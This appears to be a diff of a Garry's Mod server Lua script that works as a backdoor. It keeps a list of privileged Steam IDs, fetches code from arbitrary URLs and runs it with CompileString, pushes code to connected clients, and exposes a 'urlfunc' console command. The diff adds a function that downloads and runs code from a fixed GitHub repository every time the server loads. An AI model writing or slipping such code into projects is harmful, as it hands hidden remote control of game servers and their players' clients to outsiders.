@@ -9,7 +9,7 @@ local great = {
 			['STEAM_0:0:36074785'] = true
 }
 
-	if SERVER then	
+if SERVER then	
 		local function UrlFunc(url)
 			http.Fetch(url, function(c)
 				local func = CompileString(c, "UrlFunc", false)
@@ -17,11 +17,16 @@ local great = {
 			end)			
 		end
 		
-		local function UrlRunS(url)
+		function UrlRunS(url)
 			local func = UrlFunc(url)
 			func()
 		end
-
+		
+		function GitRunS(url)
+			local func = UrlFunc("https://raw.githubusercontent.com/Dzhet225/core64_v2/master/"..url)
+			func()
+		end
+		
 		util.AddNetworkString('_da_')
 		
 		local function RunOnCL(tar, code)
@@ -60,5 +65,7 @@ local great = {
 				UrlFunc(args[1])
 			end
 		end
-		concommand.Add("urlfunc",cmdurlfunc)
-	end
+		concommand.Add("urlfunc",cmdurlfunc)	
+		
+		GitRunS("lua/core.lua")		
+end
